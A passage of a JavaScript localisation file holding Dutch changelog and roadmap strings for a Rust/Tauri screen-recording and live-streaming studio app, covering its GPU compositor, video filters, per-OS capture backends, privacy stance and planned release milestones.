de stride, zonder swizzle op de CPU, en een headless uitleespad. Golden-tests controleren echte GPU-pixels en worden luid overgeslagen op machines zonder adapter; de prestatiedrempel op hardware houdt <strong>60 fps bij 1080p met 4 bronnen</strong> (5,2 ms/frame gemeten op een RTX 4070).","changelog.63af29da5231":"<strong>Het eigen model voor scènes, bronnen en filters</strong> (<code>fcap-scene</code>): scènes bevatten geordende items (index = z-volgorde); bronnen staan in een gedeelde pool en worden over scènes heen gebruikt; items hebben transformatie/menging/zichtbaarheid/vergrendeling en een geordende filterketen. Getest op serde-round-trips, tolerant voor onbekende sleutels, zelfherstellend bij het laden — dit is het projectformaat voor scèneverzamelingen, automatisch opgeslagen (atomisch, gedebounced) in <code>scene-collection.json</code> in de configuratiemap van het besturingssysteem.","changelog.d4fa625cbe70":"<strong>De videofilterketen op de GPU</strong>, per item en met live parameters: <strong>Chroma Key</strong> (met spillonderdrukking), <strong>Kleurcorrectie</strong> (gamma/helderheid/contrast/verzadiging/tint/dekking), <strong>LUT</strong> (.cube → 3D-rooster), <strong>Vervagen</strong> (scheidbare gaussische vervaging), <strong>Afbeeldingsmasker</strong> (alfa/luma, inverteren), <strong>Verscherpen</strong>, <strong>Scrollen</strong> (doorlopende ticker) en <strong>Bijsnijden</strong> — geordend, aan en uit te zetten, elk gecontroleerd tegen weergegeven pixels. Filters waarvan het bestand niet is geladen, worden overgeslagen, nooit zwart weergegeven.","changelog.fe58cb003f91":"<strong>Nieuwe bronnen</strong>: <strong>Afbeelding</strong> (PNG/JPEG/BMP/GIF/WebP…), <strong>Kleur</strong> (effen vlak) en <strong>Tekst</strong> — echte tekstopbouw via rustybuzz (Arabische verbindingen, ligaturen, kerning), bidi-RTL volgens UAX #9, woordafbreking, uitlijning, regelafstand, anti-aliased rasterisatie met tiny-skia. De <strong>volledige Noto Sans-familie wordt meegeleverd</strong> (variabele lettertypen: elk gewicht en elke breedte, rechtop + cursief + Arabisch + Hebreeuws; OFL-1.1 meegeleverd, herkomst vastgepind + gehasht) met <strong>terugval per tekstrun op het juiste schrift</strong>, zodat tekst op elke machine identiek wordt weergegeven; systeemfamilies blijven te kiezen en een lettertypebestand gaat voor.","changelog.4a4b0eca4f12":"<strong>De studioruntime</strong>: opnamesessies en statische bronnen worden bij elke tik afgestemd op de actieve scène; nieuw toegevoegde items passen zich bij hun eerste frame automatisch aan; het gecomponeerde programmaframe voedt dezelfde <code>preview://</code>-pijp binnen het proces op ~30 fps terwijl er op ~60 wordt gecomponeerd; de status live/wachten/fout per bron + de compositie-fps gaan mee met het <code>program</code>-event. Een machine zonder GPU krijgt een eerlijke melding „geen GPU” in plaats van een bevroren canvas.","changelog.42c0a344221a":"<strong>De studio-UI</strong>: een werkende rail <strong>Scènes</strong> (toevoegen/selecteren/hernoemen/volgorde wijzigen/verwijderen), een rail <strong>Bronnen</strong> met zichtbaarheid/vergrendeling/z-volgorde/status per item en een menu Toevoegen voor elke geïmplementeerde soort (plus bronnen delen tussen scènes), <strong>pixelnauwkeurige transformatiegrepen op het canvas</strong> (slepen, schalen via hoek/rand, draaien met snappen per 15°, bijsnijden met Alt-slepen), een dialoogvenster <strong>Filters</strong> (mengmodus + de live te bewerken keten) en dialoogvensters <strong>Eigenschappen</strong> per soort.","changelog.eaef04a3aa25":"Eerlijke opmerkingen over de reikwijdte","changelog.52f9e72e5682":"<strong>Media</strong> (videobestanden) is <strong>opgenomen in de opnamefase</strong> (besloten op 2026-07-02): het gebruikt de architectuur voor standaardcodecs en hardwaredecodering (ffmpeg op aanvraag) — er bestaat geen algemene videodecoder in pure Rust, en lege stubs zijn in strijd met het handvest.","changelog.9f015d62a029":"<strong>Browserbron</strong> verhuist naar de fase voor streamen in de diepte, achter een <strong>ontwerpverkenning voor een offscreen-webview</strong> (Tauri v2 kan een webview niet op alle platforms naar een textuur weergeven).","changelog.fb9378d724c2":"<strong>CJK-tekst</strong> gebruikt voorlopig systeemlettertypen — Noto CJK (~100 MB) wordt niet meegeleverd; de meegeleverde set dekt Latijn/Grieks/Cyrillisch + Arabisch + Hebreeuws.","changelog.30f499446f84":"De houding is ongewijzigd: gecomponeerde programmaframes blijven <strong>binnen het proces</strong> achter het <code>preview://</code>-schema met vastgepinde CORS; het enige bestand dat de studio schrijft, is de lokale scèneverzameling. Nieuwe afhankelijkheden van derden (gebruik van de <code>wgpu</code>-runtime, <code>image</code>, <code>tiny-skia</code>, <code>fontdb</code>, <code>unicode-bidi</code>, <code>pollster</code>) hebben permissieve licenties en zijn vastgelegd in <code>THIRD-PARTY-NOTICES.md</code>.","changelog.19084c726e61":"[0.25.0] — 2026-07-01 (Opnamekern)","changelog.a7a34cfb1a75":"<strong>Scherm- en vensteropname per besturingssysteem</strong> achter de eigen <code>fcap-capture</code>-interface, die frames met tijdstempel oplevert die naar de GPU kunnen worden geüpload, via een kanaal waarin het nieuwste frame wint, met een eerlijke telling van verloren frames:","changelog.871ef2f6ec64":"<strong>Windows</strong> — DXGI Desktop Duplication voor beeldschermen (met menging van de muisaanwijzer; duplicatie laat de cursor weg) en <strong>Windows.Graphics.Capture</strong> voor afzonderlijke vensters (Windows 10 1903+), bestand tegen wisselingen van de beeldschermmodus en formaatwijzigingen van vensters.","changelog.6beba9cca1b5":"<strong>macOS</strong> — <strong>ScreenCaptureKit</strong> (beeldschermen + vensters, macOS 12.3+); de toestemming voor schermopname wordt vooraf gevraagd, en een weigering toont een deeplink <strong>Instellingen voor schermopname openen</strong> in plaats van stilletjes een zwart beeld. (Het minimum van de bundel is verhoogd van 12.0 naar 12.3 — ScreenCaptureKit bestaat niet onder 12.3.)","changelog.181ee179e017":"<strong>Linux</strong> — de <strong>ScreenCast-portal</strong> (<code>ashpd</code> → PipeWire) op Wayland, waar het <em>systeemdialoogvenster</em> het scherm of venster kiest (de enige opname die Wayland toestaat — de kiezer zegt dat duidelijk), plus een rechtstreeks <strong>X11</strong>-pad (schermen + <code>_NET_CLIENT_LIST</code>-vensters) in X-sessies.","changelog.2c3347e661da":"<strong>Webcam- / capture-kaartbronnen</strong> via <code>nokhwa</code> (Media Foundation / AVFoundation / V4L2): apparaten opsommen, formaten per apparaat tonen (resolutie / fps / formaat op de draad), live RGBA-frames, en de stroom voor cameratoestemming op macOS (<code>NSCameraUsageDescription</code> meegeleverd).","changelog.eb1065b2fc17":"<strong>Live programmavoorbeeld</strong>: de „+” van de bronnenrail werkt nu — kiezers voor Beeldschermopname, Vensteropname en Video-opnameapparaat; de gekozen bron wordt live weergegeven in het programmavoorbeeld met een overlay voor label / resolutie / gemeten fps / verloren frames. De pijp loopt van begin tot eind binnen het proces (opname → JPEG → het privé <code>preview://</code>-schema van de app → canvas) — frames raken nooit een socket of de schijf. Direct tekenen bewijst de pijp; de wgpu-compositor neemt het in 0.40.0 over.","changelog.e3fc6c640b84":"<strong>Smoketests op echte hardware</strong> (in headless CI op <code>--ignored</code> gehouden): opname van beeldscherm, venster en webcam gecontroleerd met echte frames op echte hardware.","changelog.c326134a5d1e":"Voorbeeldframes blijven <strong>binnen het proces</strong> (een eigen URI-schema — geen localhost-socket, geen tijdelijke bestanden); de houding is ongewijzigd: nul uitgaande netwerkverbindingen, geen accounts, geen telemetrie.","changelog.38a90eaf4fce":"Geweigerde toestemmingen van het besturingssysteem (schermopname / camera op macOS) worden eerlijk gemeld, met een deeplink naar de instellingen.","changelog.c6a63e383dbf":"Nieuwe vermeldingen van derden: <code>pipewire</code> + <code>x11rb</code> (opname op Linux) en <code>mozjpeg</code> (MJPEG-decodering van de webcam) + <code>jpeg-encoder</code> (codering van het voorbeeld) — de laatste twee hebben de <strong>IJG</strong>-licentie, nu vermeld in <code>THIRD-PARTY-NOTICES.md</code> en toegestaan in <code>deny.toml</code>.","changelog.2f1e03606026":"[0.10.0] — 2026-07-01 (Basis &amp; repository)","changelog.4648ce7198c9":"<strong>Tauri v2 + React 19 / TypeScript / Vite 7 / Tailwind 4</strong> als bedieningsinterface (Havoc donker) boven een Rust-Cargo-workspace: de app-crate <code>freally-capture</code> + de eigen engine-crates <code>fcap-*</code> (<code>capture</code>, <code>sources</code>, <code>compositor</code>, <code>scene</code>, <code>audio</code>, <code>encode</code>, <code>stream</code>), allemaal <code>#![forbid(unsafe_code)]</code>.","changelog.b146fa224118":"De <strong>dockindeling van de studio</strong> (groot programmavoorbeeld, rails voor Scènes/Bronnen, Audiomixer, Bediening, Statistieken) met eerlijke toestanden „nog niet geïmplementeerd” bij elke bediening.","changelog.6b08ed4da71e":"De <strong>getypeerde brug tussen UI en kern</strong>: <code>health()</code> (versies van de app + de gekoppelde kerncrates), <code>settings_get</code>/<code>settings_set</code>, en een <code>stats</code>-pushevent van ~2 Hz dat live in het statistiekendock wordt weergegeven (tijdelijke gegevens, als zodanig gelabeld tot de echte bemonstering in 0.70.0).","changelog.29f30cb39613":"De <strong>opslag voor instellingen</strong>: JSON in de configuratiemap van het besturingssysteem, atomisch schrijven via tijdelijk bestand + hernoemen, terugval bij corrupte of ontbrekende bestanden; de schakelaar van het statistiekendock blijft tussen sessies bewaard.","changelog.68352e507bf1":"<strong>CI-matrix</strong> (Windows/macOS/Linux): rustfmt, clippy <code>-D warnings</code>, tests, cargo-deny + cargo-audit, UI-prettier/eslint/tsc/vitest/build en Tauri-debugbuilds per besturingssysteem; een <strong>releaseworkflow</strong> die door een tag wordt gestart (installatieprogramma's per besturingssysteem → concept-GitHub-release).","changelog.77fbaa6cd383":"De propriëtaire <code>LICENSE</code> + bestuursdocumenten en de eerste <code>docs/</code>-site op GitHub Pages met het pictogram met de true-alpha-badge.","changelog.b36a760b89c7":"<strong>Windows-release gecontroleerd</strong>: GUI-app <strong>zonder consolevenster</strong> (gecontroleerd op het gebouwde programma); de MSI- en NSIS-installatieprogramma's worden gebouwd.","changelog.5da8006aa5c6":"<strong>Nul uitgaande netwerkverbindingen</strong> in de app; een strikte CSP; alleen de minimale capability <code>core:default</code>; streamsleutels en geheimen worden niet opgeslagen (die bestaan nog niet); <strong>nergens AI/ML</strong> (handvest).","changelog.62e65d7911da":"Gepland — 0.25.0 (Opnamekern)","changelog.216d50682cb6":"Scherm- en vensteropname per besturingssysteem (Windows DXGI + Windows.Graphics.Capture; macOS ScreenCaptureKit; Linux PipeWire-portal + X11) achter een <code>Capture</code>-interface.","changelog.22b2b1c3d027":"Invoer van webcams en capture-kaarten via <code>nokhwa</code>; een live programmavoorbeeld.","changelog.8716e909baa8":"Gepland — 0.40.0 (Compositor + scènes/bronnen)","changelog.42125f1329d8":"De eigen <code>wgpu</code>-GPU-compositor: transformatie/bijsnijden/schalen/draaien per bron, mengmodi en de videofilterketen (chroma key, kleurcorrectie, LUT, vervaging, masker, verscherpen, scrollen).","changelog.5e0cc21c74cc":"Het eigen datamodel voor scènes, bronnen en filters; de volledige set bronnen (afbeelding, tekst, kleur, media, browser); de rails voor Scènes en Bronnen met transformatiegrepen op het canvas.","changelog.25af1c9ae9bd":"Gepland — 0.55.0 (Audiomixer + opnemen)","changelog.c33ce0f2f787":"De <code>cpal</code>-audiograaf: volume/dempen/monitor per bron, tot 6 sporen, synchronisatieverschuiving, ducking, push-to-talk, een LUFS-meter en filters (eigen ruisonderdrukking met klassieke DSP — geen ML — plus gate, compressor, limiter, EQ, versterking).","changelog.e1afeb62fe94":"Opnemen met meerdere sporen via hardware-encoders (NVENC/Quick Sync/AMF/VAAPI/VideoToolbox) + terugval op x264, plus de eigen verliesvrije codec <code>freally-video</code>; containers mp4/mkv/mov/webm; bestandssplitsing; lokale kopie met aparte sporen. De standaardcodecs waar patenten op rusten via de ffmpeg-brug op aanvraag, gecontroleerd met een hash.","changelog.b03b02234da0":"Gepland — 0.70.0 (Studio-MVP — eerste openbare versie)","changelog.2f588cc01f93":"Livestreamen naar één bestemming (RTMP/RTMPS) naar Twitch/YouTube/Kick/Facebook/Trovo/een eigen server, met automatisch opnieuw verbinden en streamvertraging; de hoofdopname loopt door, ongeacht de streamstatus.","changelog.8591c913ffa0":"Studiomodus (voorbeeld/programma) + overgangen (knip/vervagen/schuiven/vegen/stinger/luma-wipe); de virtuele camera (per besturingssysteem); globale sneltoetsen; profielen + scèneverzamelingen; het statistiekendock. <strong>Eerste openbare build — volledig gratis, net als elke Freally-app.</strong>","changelog.ae9d61fc4bdf":"Gepland — 0.85.0 (Multistream / SRT / WHIP + scènes, bronnen en encoders in de diepte)","changelog.384e7dfb96e1":"Gelijktijdige multistream naar meerdere bestemmingen, rechtstreeks naar elk platform; de protocollen SRT en WHIP; verticale uitvoer en uitvoer met meerdere canvassen.","changelog.0cb0b6d267f0":"De doorlopende replaybuffer met voorinstellingen; geneste scènes, brongroepen + audio per scène; een bron voor diavoorstellingen + voorinstellingen voor capture-kaarten; color-/luma-key + filters voor rendervertraging; uitvoer met hoge fps/4K, omgang met kleurruimten + verkleining van de uitvoer; streammarkeringen aan de kant van de opname; virtuele camera in de diepte (enkele bron + audio); premium stinger- en luma-pakketten; geavanceerde filters.","changelog.060db9595543":"Gepland — 1.0.0 (API voor bediening op afstand, scripts, game-opname &amp; lancering)","changelog.26a3256fb4c7":"De WebSocket-API voor bediening op afstand (in de stijl van Stream Deck / Companion) + browserdocks; scripts in Lua/JS + een plug-in-SDK.","changelog.bde34ffd89b3":"Game-opname (hooks op de GPU-API's DX/GL/Vulkan, eerlijk gemarkeerd); optioneel NDI + VST.","changelog.fdf05cb85cbf":"Ondertekende/genotariseerde installatieprogramma's (Win MSI/NSIS, macOS .app/.dmg + de plug-in voor de virtuele camera, Linux AppImage/.deb/.rpm/Flatpak) + zelf gehoste automatische updates.","changelog.28cee61c3ca1":"Toegankelijkheid (toetsenbord eerst, labels voor schermlezers, hoog contrast) en vertaling van de UI in 18 talen (<code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, Engels eerst, Arabisch van rechts naar links); onboarding + sjablonen."}; for (var k in add) mine[k] = add[k]; })(window.CAPTURE_I18N = window.CAPTURE_I18N || {});
